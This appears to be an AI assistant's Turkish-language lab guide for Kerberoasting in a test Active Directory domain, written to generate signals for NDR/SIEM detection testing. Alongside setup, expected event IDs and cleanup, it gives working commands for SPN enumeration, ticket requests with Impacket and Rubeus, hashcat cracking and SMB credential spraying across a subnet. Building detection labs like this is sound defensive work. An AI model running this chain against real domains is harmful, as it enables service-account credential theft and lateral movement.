@@ -1,0 +1,705 @@
+Evet. Aşağıdaki zincir, anlattığın **lab ortamı** için Kerberoasting’i baştan sona gösterecek şekilde hazırlanmıştır:
+
+```text
+Domain    : lab.local
+DC / AD   : 192.168.39.143
+Kali      : domain’e join değil
+Client-1  : domain joined Windows client
+Client-2  : domain joined Windows client
+Amaç      : NDR / detection testi, gürültülü Kerberoasting senaryosu
+```
+
+## 1. Kerberoasting’i hızlıca hatırlayalım
+
+**Kerberoasting**, Active Directory’de **SPN atanmış servis hesaplarına** ait Kerberos TGS ticket’larının istenip offline olarak kırılmaya çalışılmasıdır.
+
+Normal akış şöyledir:
+
+```text
+1. Saldırgan geçerli bir domain kullanıcısı ile authenticate olur.
+2. AD içinde SPN’e sahip servis hesaplarını enum eder.
+3. Bu servis hesapları için TGS ticket ister.
+4. Dönen TGS ticket, servis hesabının parola materyaliyle şifrelenmiştir.
+5. Ticket hash formatına çevrilir.
+6. Hashcat/John ile offline cracking yapılır.
+7. Parola kırılırsa servis hesabı ile domain içinde erişim denenir.
+```
+
+Önemli fark:
+
+```text
+AS-REP roasting:
+- Pre-auth disabled kullanıcıları hedefler.
+- Otantikesiz yapılabilir.
+
+Kerberoasting:
+- Genelde geçerli domain credential ister.
+- Hedef hesapta SPN olmalıdır.
+- Pre-auth disabled olmasına gerek yoktur.
+```
+
+MITRE bunu **T1558.003 - Kerberoasting** olarak izler; teknik, geçerli TGT veya Kerberos trafiği üzerinden brute-force’a uygun TGS ticket elde etmeye dayanır. ([MITRE ATT&CK][1])
+
+---
+
+# 2. AD / Domain Controller pre-requirements
+
+## 2.1. Domain’de normal bir test kullanıcısı oluştur
+
+Kerberoasting için düşük yetkili bir kullanıcı yeterlidir.
+
+DC üzerinde PowerShell’i admin aç:
+
+```powershell
+Import-Module ActiveDirectory
+
+$Password = ConvertTo-SecureString "P@ssw0rd123!" -AsPlainText -Force
+
+New-ADUser `
+  -Name "Lab Lowpriv User" `
+  -SamAccountName "lab.user" `
+  -UserPrincipalName "lab.user@lab.local" `
+  -AccountPassword $Password `
+  -Enabled $true `
+  -PasswordNeverExpires $true `
+  -ChangePasswordAtLogon $false
+```
+
+Bu kullanıcı Kali’den ve Windows client’lardan Kerberoasting için kullanılacak.
+
+---
+
+## 2.2. Kerberoast edilebilir servis hesapları oluştur
+
+Kerberoasting için hedef hesaplarda **SPN** olması gerekir. Microsoft’un `setspn` aracı AD service account üzerindeki SPN değerlerini okuma, ekleme, değiştirme ve silme için kullanılır. ([Microsoft Learn][2])
+
+Lab için 20 tane gürültülü servis hesabı oluşturalım:
+
+```powershell
+Import-Module ActiveDirectory
+
+$OUName = "Kerberoast-Lab"
+$DomainDN = "DC=lab,DC=local"
+$OUPath = "OU=$OUName,$DomainDN"
+
+if (-not (Get-ADOrganizationalUnit -LDAPFilter "(ou=$OUName)" -ErrorAction SilentlyContinue)) {
+    New-ADOrganizationalUnit -Name $OUName -Path $DomainDN
+}
+
+$SvcPassword = ConvertTo-SecureString "Winter2026!" -AsPlainText -Force
+
+1..20 | ForEach-Object {
+    $Num = "{0:D3}" -f $_
+    $Sam = "svc_roast$Num"
+    $UPN = "$Sam@lab.local"
+    $Name = "Kerberoast Service $Num"
+    $SPN1 = "HTTP/roast$Num.lab.local"
+    $SPN2 = "MSSQLSvc/roast$Num.lab.local:1433"
+
+    New-ADUser `
+        -Name $Name `
+        -SamAccountName $Sam `
+        -UserPrincipalName $UPN `
+        -AccountPassword $SvcPassword `
+        -Enabled $true `
+        -PasswordNeverExpires $true `
+        -ChangePasswordAtLogon $false `
+        -Path $OUPath `
+        -ServicePrincipalNames @($SPN1, $SPN2)
+
+    Write-Host "[+] Created $Sam with SPNs $SPN1, $SPN2"
+}
+```
+
+Kontrol:
+
+```powershell
+Get-ADUser -Filter 'ServicePrincipalName -like "*"' `
+  -Properties ServicePrincipalName |
+  Select-Object SamAccountName, ServicePrincipalName
+```
+
+Alternatif `setspn` ile kontrol:
+
+```cmd
+setspn -Q */*
+```
+
+Spesifik servis hesabı:
+
+```cmd
+setspn -L svc_roast001
+```
+
+---
+
+## 2.3. Lab için RC4 sinyali üretmek istiyorsan
+
+NDR/SIEM testlerinde klasik Kerberoasting tespitleri genelde **Event ID 4769 + RC4 / etype 0x17 + yüksek hacimli TGS request** etrafında döner. MITRE’nin detection stratejisi de Kerberoasting için 4769, RC4 encryption type ve kısa sürede anormal sayıda service ticket request gibi sinyalleri vurgular. ([MITRE ATT&CK][3])
+
+Lab’da özellikle RC4 üretmek istersen servis hesaplarını RC4 destekleyecek şekilde ayarlayabilirsin:
+
+```powershell
+Get-ADUser -Filter 'SamAccountName -like "svc_roast*"' |
+ForEach-Object {
+    Set-ADUser $_ -Replace @{'msDS-SupportedEncryptionTypes' = 4}
+}
+```
+
+Kontrol:
+
+```powershell
+Get-ADUser -Filter 'SamAccountName -like "svc_roast*"' `
+  -Properties msDS-SupportedEncryptionTypes |
+  Select-Object SamAccountName, msDS-SupportedEncryptionTypes
+```
+
+Bu sadece lab için önerilir. Gerçek ortamda RC4’ü desteklemek zayıf konfigürasyondur.
+
+---
+
+## 2.4. DC üzerinde audit aç
+
+DC üzerinde:
+
+```cmd
+auditpol /set /subcategory:"Kerberos Service Ticket Operations" /success:enable /failure:enable
+auditpol /set /subcategory:"Kerberos Authentication Service" /success:enable /failure:enable
+```
+
+Kontrol:
+
+```cmd
+auditpol /get /subcategory:"Kerberos Service Ticket Operations"
+auditpol /get /subcategory:"Kerberos Authentication Service"
+```
+
+Kerberoasting sırasında özellikle şu event’leri göreceksin:
+
+```text
+4768 - Kerberos TGT requested / issued
+4769 - Kerberos service ticket requested
+4770 - Kerberos service ticket renewed
+4624 - Başarılı logon, özellikle sonradan credential validation yaparsan
+4625 - Başarısız logon
+```
+
+Microsoft’a göre **Event ID 4769**, KDC her TGS ticket request aldığında domain controller üzerinde oluşur. ([Microsoft Learn][4])
+**Event ID 4768** ise KDC bir TGT verdiğinde domain controller üzerinde oluşur. ([Microsoft Learn][5])
+
+---
+
+# 3. Windows client pre-requirements
+
+Her iki Windows client domain’e join olmalı ve DNS olarak DC’yi kullanmalı.
+
+Client üzerinde kontrol:
+
+```cmd
+whoami
+whoami /fqdn
+hostname
+ipconfig /all
+nltest /dsgetdc:lab.local
+nltest /dclist:lab.local
+```
+
+Kerberos cache kontrol:
+
+```cmd
+klist
+```
+
+Temiz başlangıç için:
+
+```cmd
+klist purge
+```
+
+Rubeus kullanacaksan client üzerinde örnek dizin:
+
+```powershell
+mkdir C:\Tools
+mkdir C:\Temp
+```
+
+Rubeus’u `C:\Tools\Rubeus.exe` altına koy.
+
+---
+
+# 4. Kali pre-requirements
+
+## 4.1. Gerekli araçlar
+
+Kali’de:
+
+```bash
+sudo apt update
+sudo apt install -y impacket-scripts hashcat nmap netexec ldap-utils dnsutils smbclient
+```
+
+Kali’de Impacket scriptleri çoğu kurulumda `impacket-GetUserSPNs` formatında gelir. Kali’nin `impacket-scripts` paketi Impacket example scriptlerini komut satırına ekler. ([GitHub][6])
+
+Kontrol:
+
+```bash
+which impacket-GetUserSPNs
+which GetUserSPNs.py
+which hashcat
+which nxc
+```
+
+---
+
+## 4.2. Kali DNS / hosts ayarı
+
+DC hostname’ini bilmiyorsan önce SRV sorgusu dene:
+
+```bash
+dig @192.168.39.143 _kerberos._tcp.lab.local SRV
+dig @192.168.39.143 _ldap._tcp.lab.local SRV
+```
+
+Geçici hosts kaydı:
+
+```bash
+echo "192.168.39.143 dc.lab.local lab.local" | sudo tee -a /etc/hosts
+```
+
+---
+
+## 4.3. Saat senkronu
+
+Kerberos için saat farkı problem çıkarabilir.
+
+```bash
+date
+```
+
+Gerekirse:
+
+```bash
+sudo apt install -y ntpsec-ntpdate
+sudo ntpdate -u 192.168.39.143
+```
+
+---
+
+# 5. Recon fazı — Kali’den
+
+## 5.1. DC port keşfi
+
+Gürültülü temel recon:
+
+```bash
+nmap -Pn -sS -sV -O \
+  -p 53,88,135,139,389,445,464,593,636,3268,3269 \
+  192.168.39.143
+```
+
+Daha da gürültülü:
+
+```bash
+nmap -Pn -A -T4 -p- 192.168.39.143
+```
+
+Beklenen NDR sinyali:
+
+```text
+Kali -> DC TCP/88    Kerberos
+Kali -> DC TCP/389   LDAP
+Kali -> DC TCP/445   SMB
+Kali -> DC TCP/53    DNS
+Kali -> DC port sweep / service detection
+```
+
+---
+
+## 5.2. LDAP base recon
+
+Anonim LDAP bazen kapalı olur, ama base naming context sorgusu denenebilir:
+
+```bash
+ldapsearch -x -H ldap://192.168.39.143 -s base namingcontexts
+```
+
+Geçerli kullanıcı ile LDAP bind:
+
+```bash
+ldapsearch -x \
+  -H ldap://192.168.39.143 \
+  -D 'lab.user@lab.local' \
+  -w 'P@ssw0rd123!' \
+  -b 'DC=lab,DC=local' \
+  '(servicePrincipalName=*)' \
+  sAMAccountName servicePrincipalName
+```
+
+Bu aşama NDR/SIEM tarafında LDAP query olarak görünür.
+
+---
+
+# 6. Kerberoasting — Kali / Impacket
+
+## 6.1. SPN enum
+
+Önce sadece SPN’li kullanıcıları listele:
+
+```bash
+impacket-GetUserSPNs lab.local/lab.user:'P@ssw0rd123!' \
+  -dc-ip 192.168.39.143
+```
+
+Alternatif:
+
+```bash
+GetUserSPNs.py lab.local/lab.user:'P@ssw0rd123!' \
+  -dc-ip 192.168.39.143
+```
+
+Impacket `GetUserSPNs.py`, normal user account’lara bağlı SPN’leri bulmayı hedefleyen Kerberoasting aracıdır. ([GitHub][6])
+
+---
+
+## 6.2. TGS hash request
+
+Asıl Kerberoasting:
+
+```bash
+impacket-GetUserSPNs lab.local/lab.user:'P@ssw0rd123!' \
+  -dc-ip 192.168.39.143 \
+  -request \
+  -outputfile kerberoast_tgs.txt
+```
+
+Kontrol:
+
+```bash
+cat kerberoast_tgs.txt
+```
+
+Beklenen hash formatı:
+
+```text
+$krb5tgs$23$...
+$krb5tgs$17$...
+$krb5tgs$18$...
+```
+
+Hashcat örnek hash dokümantasyonuna göre Kerberos TGS-REP etype 23 için mode `13100`, etype 17 için `19600`, etype 18 için `19700` kullanılır. ([hashcat.net][7])
+
+---
+
+## 6.3. Gürültülü Kerberoasting loop
+
+NDR testini daha görünür yapmak için aynı TGS request işlemini tekrar tekrar çalıştır:
+
+```bash
+for i in {1..20}; do
+  echo "[*] Kerberoast round $i"
+  impacket-GetUserSPNs lab.local/lab.user:'P@ssw0rd123!' \
+    -dc-ip 192.168.39.143 \
+    -request \
+    -outputfile "kerberoast_round_$i.txt"
+  sleep 2
+done
+```
+
+Sonra hepsini birleştir:
+
+```bash
+cat kerberoast_round_*.txt | sort -u > kerberoast_all_unique.txt
+wc -l kerberoast_all_unique.txt
+```
+
+Bu test özellikle şu sinyalleri büyütür:
+
+```text
+Çok sayıda Kerberos TGS-REQ
+DC Security log 4769 hacim artışı
+Kali IP’sinden servis hesaplarına yönelik ticket istekleri
+LDAP SPN enumeration + Kerberos TGS request korelasyonu
+```
+
+---
+
+# 7. Kerberoasting — Windows client / Rubeus
+
+Client-1 veya Client-2 üzerinde domain kullanıcısı ile oturum aç.
+
+Kontrol:
+
+```cmd
+whoami
+klist
+nltest /dsgetdc:lab.local
+```
+
+Rubeus ile tüm SPN’li kullanıcıları roast et:
+
+```powershell
+C:\Tools\Rubeus.exe kerberoast /domain:lab.local /dc:dc.lab.local /format:hashcat /outfile:C:\Temp\rubeus_kerberoast.txt /nowrap
+```
+
+Spesifik kullanıcı:
+
+```powershell
+C:\Tools\Rubeus.exe kerberoast /user:svc_roast001 /domain:lab.local /dc:dc.lab.local /format:hashcat /outfile:C:\Temp\svc_roast001.txt /nowrap
+```
+
+OU bazlı:
+
+```powershell
+C:\Tools\Rubeus.exe kerberoast /ou:"OU=Kerberoast-Lab,DC=lab,DC=local" /domain:lab.local /dc:dc.lab.local /format:hashcat /outfile:C:\Temp\rubeus_ou.txt /nowrap
+```
+
+Rubeus’un `kerberoast` modülü, SPN’li user account’ları hedefleyebilir; `/user`, `/ou`, `/domain`, `/dc`, `/outfile`, `/format:hashcat` ve `/nowrap` gibi parametreleri destekler. ([specterops.gitbook.io][8])
+
+---
+
+## 7.1. Gürültülü Rubeus loop
+
+Client-1 üzerinde:
+
+```powershell
+1..20 | ForEach-Object {
+    Write-Host "[*] Rubeus kerberoast round $_"
+    C:\Tools\Rubeus.exe kerberoast /domain:lab.local /dc:dc.lab.local /format:hashcat /outfile:C:\Temp\rubeus_round_$_.txt /nowrap
+    Start-Sleep -Seconds 2
+}
+```
+
+Client-2 üzerinde aynı anda çalıştırırsan NDR tarafında iki ayrı source host’tan TGS request patlaması görürsün.
+
+---
+
+# 8. Hash cracking — Kali
+
+Windows client’taki dosyayı Kali’ye al. Örneğin Kali’de web server açıp upload tarafını manuel yapabilir veya SMB share kullanabilirsin. En basit yol Rubeus çıktısını kopyalayıp Kali’de `rubeus_kerberoast.txt` olarak kaydetmek.
+
+Hashleri etype’a göre ayır:
+
+```bash
+grep -a '\$krb5tgs\$23' kerberoast_all_unique.txt > tgs_etype23.txt
+grep -a '\$krb5tgs\$17' kerberoast_all_unique.txt > tgs_etype17.txt
+grep -a '\$krb5tgs\$18' kerberoast_all_unique.txt > tgs_etype18.txt
+```
+
+RC4 / etype 23 crack:
+
+```bash
+hashcat -m 13100 tgs_etype23.txt /usr/share/wordlists/rockyou.txt --status --status-timer=10
+```
+
+AES128 / etype 17 crack:
+
+```bash
+hashcat -m 19600 tgs_etype17.txt /usr/share/wordlists/rockyou.txt --status --status-timer=10
+```
+
+AES256 / etype 18 crack:
+
+```bash
+hashcat -m 19700 tgs_etype18.txt /usr/share/wordlists/rockyou.txt --status --status-timer=10
+```
+
+Sonuç göster:
+
+```bash
+hashcat -m 13100 tgs_etype23.txt --show
+hashcat -m 19600 tgs_etype17.txt --show
+hashcat -m 19700 tgs_etype18.txt --show
+```
+
+Lab’da yukarıdaki servis hesaplarını `Winter2026!` ile oluşturduysan kırılması beklenir.
+
+---
+
+# 9. Credential validation — gürültülü ama kontrollü
+
+Kırılan servis hesabı örneğin:
+
+```text
+svc_roast001:Winter2026!
+```
+
+Kali’den DC’ye SMB auth kontrol:
+
+```bash
+nxc smb 192.168.39.143 \
+  -d lab.local \
+  -u svc_roast001 \
+  -p 'Winter2026!' \
+  --shares
+```
+
+Client’lara karşı dene:
+
+```bash
+nxc smb 192.168.39.0/24 \
+  -d lab.local \
+  -u svc_roast001 \
+  -p 'Winter2026!' \
+  --shares
+```
+
+Daha kontrollü:
+
+```bash
+nxc smb 192.168.39.143 192.168.39.10 192.168.39.11 \
+  -d lab.local \
+  -u svc_roast001 \
+  -p 'Winter2026!' \
+  --shares
+```
+
+Bu aşamada NDR/SIEM’de şunları beklersin:
+
+```text
+Kali -> DC SMB 445 authentication
+Kali -> Client-1 SMB 445 authentication
+Kali -> Client-2 SMB 445 authentication
+4624 başarılı logon
+4625 başarısız logon
+NTLM/Kerberos authentication eventleri
+SMB session açılışları
+```
+
+Remote command execution’a geçmeden sadece `--shares` ile kalırsan lab için credential validation zinciri görünür, ama sistemi değiştirme riskin düşük kalır.
+
+---
+
+# 10. Tam saldırı zinciri — tek akış
+
+## Kali tarafı
+
+```bash
+# 1. Recon
+nmap -Pn -sS -sV -O -p 53,88,135,139,389,445,464,593,636,3268,3269 192.168.39.143
+
+# 2. DNS / LDAP basic check
+dig @192.168.39.143 _kerberos._tcp.lab.local SRV
+ldapsearch -x -H ldap://192.168.39.143 -s base namingcontexts
+
+# 3. SPN enum
+impacket-GetUserSPNs lab.local/lab.user:'P@ssw0rd123!' -dc-ip 192.168.39.143
+
+# 4. Kerberoast
+impacket-GetUserSPNs lab.local/lab.user:'P@ssw0rd123!' -dc-ip 192.168.39.143 -request -outputfile kerberoast_tgs.txt
+
+# 5. Gürültülü tekrar
+for i in {1..20}; do
+  impacket-GetUserSPNs lab.local/lab.user:'P@ssw0rd123!' -dc-ip 192.168.39.143 -request -outputfile "kerberoast_round_$i.txt"
+  sleep 2
+done
+
+# 6. Hashleri birleştir
+cat kerberoast_tgs.txt kerberoast_round_*.txt | sort -u > kerberoast_all_unique.txt
+
+# 7. Etype ayır
+grep -a '\$krb5tgs\$23' kerberoast_all_unique.txt > tgs_etype23.txt
+grep -a '\$krb5tgs\$17' kerberoast_all_unique.txt > tgs_etype17.txt
+grep -a '\$krb5tgs\$18' kerberoast_all_unique.txt > tgs_etype18.txt
+
+# 8. Crack
+hashcat -m 13100 tgs_etype23.txt /usr/share/wordlists/rockyou.txt --status --status-timer=10
+hashcat -m 19600 tgs_etype17.txt /usr/share/wordlists/rockyou.txt --status --status-timer=10
+hashcat -m 19700 tgs_etype18.txt /usr/share/wordlists/rockyou.txt --status --status-timer=10
+
+# 9. Sonuç
+hashcat -m 13100 tgs_etype23.txt --show
+hashcat -m 19600 tgs_etype17.txt --show
+hashcat -m 19700 tgs_etype18.txt --show
+
+# 10. Credential validation
+nxc smb 192.168.39.143 -d lab.local -u svc_roast001 -p 'Winter2026!' --shares
+```
+
+---
+
+# 11. NDR / SIEM tarafında beklenen sinyaller
+
+## Network
+
+```text
+Kali -> DC : TCP/88 Kerberos
+Kali -> DC : TCP/389 LDAP
+Kali -> DC : TCP/445 SMB
+Client-1 -> DC : TCP/88 Kerberos
+Client-2 -> DC : TCP/88 Kerberos
+```
+
+## AD Security logs
+
+```text
+4768 - lab.user için TGT
+4769 - svc_roast001...svc_roast020 için çok sayıda TGS request
+4624 - credential validation sırasında başarılı logon
+4625 - yanlış parola veya yanlış kullanıcı denemeleri varsa başarısız logon
+```
+
+## Kerberoasting tespit mantığı
+
+Özellikle şu korelasyonlar iyi sinyal verir:
+
+```text
+Aynı source host kısa sürede çok sayıda farklı SPN için TGS istedi
+Servis hesaplarına yönelik anormal TGS hacmi oluştu
+Ticket Encryption Type 0x17 / RC4 görüldü
+LDAP’te servicePrincipalName=* sorgusundan hemen sonra TGS request patlaması oldu
+Normal workstation olmayan Kali IP’sinden DC’ye Kerberos/LDAP aktivitesi geldi
+Rubeus.exe process execution + 4769 artışı eşleşti
+```
+
+Microsoft 4769’un her TGS request için DC üzerinde üretildiğini belirtir; bu yüzden Kerberoasting görünürlüğünün merkezi genellikle DC Security loglarıdır. ([Microsoft Learn][4])
+
+---
+
+# 12. Temizlik
+
+Lab bittiğinde servis hesaplarını kaldırmak istersen DC üzerinde:
+
+```powershell
+Get-ADUser -Filter 'SamAccountName -like "svc_roast*"' |
+Remove-ADUser -Confirm:$false
+```
+
+OU’yu kaldır:
+
+```powershell
+Remove-ADOrganizationalUnit `
+  -Identity "OU=Kerberoast-Lab,DC=lab,DC=local" `
+  -Recursive `
+  -Confirm:$false
+```
+
+`lab.user` test kullanıcısını kaldır:
+
+```powershell
+Remove-ADUser lab.user -Confirm:$false
+```
+
+Özet zincir:
+
+```text
+Recon
+→ LDAP SPN enumeration
+→ TGS request / Kerberoasting
+→ Hash extraction
+→ Offline cracking
+→ Credential validation
+→ NDR/SIEM event korelasyonu
+```
+
+Bu lab’da en net NDR çıktısını almak için aynı Kerberoasting komutunu hem Kali’den hem iki Windows client’tan peş peşe çalıştırman iyi olur.
+
+[1]: https://attack.mitre.org/techniques/T1558/003/?utm_source=chatgpt.com "Steal or Forge Kerberos Tickets: Kerberoasting"
+[2]: https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/setspn?utm_source=chatgpt.com "Setspn | Microsoft Learn"
+[3]: https://attack.mitre.org/detectionstrategies/DET0157/?utm_source=chatgpt.com "Detect Kerberoasting Attempts (T1558.003)"
+[4]: https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4769?utm_source=chatgpt.com "4769(S, F) A Kerberos service ticket was requested."
+[5]: https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4768?utm_source=chatgpt.com "4768(S, F) A Kerberos authentication ticket (TGT) was ..."
+[6]: https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py?utm_source=chatgpt.com "impacket/examples/GetUserSPNs.py at master"
+[7]: https://hashcat.net/wiki/doku.php?id=example_hashes "
+    example_hashes    [hashcat wiki]
+  "
+[8]: https://specterops.gitbook.io/ghostpack/rubeus/roasting?utm_source=chatgpt.com "Roasting | GhostPack - SpecterOps Documentation Library"
